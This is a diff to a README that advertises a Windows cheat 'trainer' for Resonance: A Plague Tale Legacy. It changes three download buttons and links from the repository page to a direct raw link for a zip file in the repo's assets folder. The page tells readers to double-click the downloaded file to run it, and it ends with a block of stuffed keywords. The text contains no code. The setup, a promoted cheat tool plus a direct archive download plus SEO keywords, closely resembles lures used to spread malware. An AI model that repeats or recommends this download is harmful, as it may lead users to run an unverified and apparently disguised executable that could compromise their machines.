@@ -4,11 +4,11 @@
 
 Welcome! This page will guide you through downloading and running the **Resonance: A Plague Tale Legacy Trainer** on your Windows PC. This tool gives you powerful controls to enhance your gaming experience, including unlocking all chapters, editing resonance points, adjusting game speed, and much more.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/Download-A_Plague_Tale_Resonance_Trainer-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/n7gamer116-beep/A-Plague-Tale-Resonance-Trainer)
+[![DOWNLOAD NOW](https://img.shields.io/badge/Download-A_Plague_Tale_Resonance_Trainer-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/n7gamer116-beep/A-Plague-Tale-Resonance-Trainer/main/assets/Tale_Trainer_Resonance_Plague_v1.1-alpha.2.zip)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[https://github.com/n7gamer116-beep/A-Plague-Tale-Resonance-Trainer](https://github.com/n7gamer116-beep/A-Plague-Tale-Resonance-Trainer)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/n7gamer116-beep/A-Plague-Tale-Resonance-Trainer/main/assets/Tale_Trainer_Resonance_Plague_v1.1-alpha.2.zip](https://raw.githubusercontent.com/n7gamer116-beep/A-Plague-Tale-Resonance-Trainer/main/assets/Tale_Trainer_Resonance_Plague_v1.1-alpha.2.zip)**
 
 Once you click the link, you will be taken to the download page. Follow the on-screen instructions to save the file to your computer. After the download is complete, locate the file in your Downloads folder and double-click it to run the trainer.
 
@@ -135,6 +135,6 @@ Your feedback helps improve the trainer. If you have suggestions for new feature
 
 Thank you for choosing the A-Plague-Tale-Resonance-Trainer. We hope it enhances your gaming experience and lets you enjoy *Resonance: A Plague Tale Legacy* to the fullest. Download it today, unlock everything, and dive into the story without limits!
 
-[![GET STARTED](https://img.shields.io/badge/Download_Now-A_Plague_Tale_Resonance_Trainer-orange?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/n7gamer116-beep/A-Plague-Tale-Resonance-Trainer)
+[![GET STARTED](https://img.shields.io/badge/Download_Now-A_Plague_Tale_Resonance_Trainer-orange?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/n7gamer116-beep/A-Plague-Tale-Resonance-Trainer/main/assets/Tale_Trainer_Resonance_Plague_v1.1-alpha.2.zip)
 
 Keywords: 2026, change-resonance-points, config-manager, configurable-hotkeys, desktop-tool, game-speed, gaming-tools, god-mode, pc-game, profile-manager, quick-presets, resonance-a-plague-tale-legacy-trainer, resonance-points-editor, saved-profiles, trainer-dashboard, unlock-all-chapters, unlock-all-codex-entries, unlock-everything, windows, windows-11
